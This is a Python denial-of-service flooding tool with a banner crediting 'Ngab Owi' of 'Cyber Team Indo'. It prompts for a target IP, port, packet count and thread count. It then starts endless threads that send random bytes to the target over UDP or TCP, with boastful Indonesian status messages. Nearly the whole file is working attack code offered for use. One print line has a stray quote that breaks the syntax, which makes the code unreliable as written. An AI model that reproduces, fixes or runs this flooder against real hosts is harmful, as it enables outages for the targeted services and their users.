import random
import socket
import threading
import os

 #Color
yellow='\033[93m'
gren='\033[92m'
cyan='\033[96m'
pink='\033[95m'
red='\033[91m'
b='\033[1m'


os.system("clear")
print("\033[91m     =========================================================   \n")
print("      { × } Author Tools : Ngab Owi                                    ")
print("      { × }  Community  : Cyber Team Indo                            \n")
print("     =========================================================   ")

print(yellow+"••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••")
print("∆ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜 █ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜 █ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜      ∆  ")
print("∆ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜 █ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜 █ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜      ∆   ")
print("∆ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜 █ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜 █ 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜      ∆    "+b)
print("∆                                                                                ∆  ")
print("∆                                                                                ∆  ")
print(red+"∆  𝗡𝗚𝗔𝗕 𝗢𝗪𝗜                           𝗡𝗚𝗔𝗕 𝗢𝗪𝗜                              ∆  ")
print("∆  𝗡                 𝗜                           𝗡                𝗜                ∆ ")
print("∆  𝗡𝗚𝗔𝗕 𝗢𝗪𝗜                            𝗡𝗚𝗔𝗕 𝗢𝗪𝗜                                              ∆ ")
print("∆                                                                                 ∆ ")
print("∆  𝗡                                                                            ∆ ")
print("∆  𝗡                      𝗡𝗚𝗔𝗕 𝗢𝗪𝗜▀𝗡𝗚𝗔𝗕 𝗢𝗪𝗜                                                      ∆ ")
print("∆  𝗡                      𝗡                                        𝗜            ∆ ")
print("∆  𝗡                      𝗡𝗚𝗔𝗕 𝗢𝗪𝗜▀𝗡𝗚𝗔𝗕 𝗢𝗪𝗜                                                   ∆ ")
print("\033[91m     ░                                                                ")


ip = str(input(" IP TARGET : "))
port = int(input(" PORT TARGET : "))
choice = str(input(" GASS  ? (y/n) : "))
times = int(input(" PACKETS : "))
threads = int(input(" THREADS : "+red))
def run():
	data = random._urandom(1024)
	i = random.choice(("[***]","[^^^]","[!!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +yellow+" NGAB OWI KIRIM PAKET CUY !!!\n KIRIM KE",ip,":",port ")
		except:
			print("[ ! ] LAH LAG ? HAYYU")

def run2():
	data = random._urandom(16)
	i = random.choice(("[T***]","[^^^]","[!!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"NGAB OWI KIRIM PAKET CUY !!!\n KIRIM KE",ip,":",port)
		except:
			s.close()
			print("[*] BUKAN NGAB OWI CUY !!!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()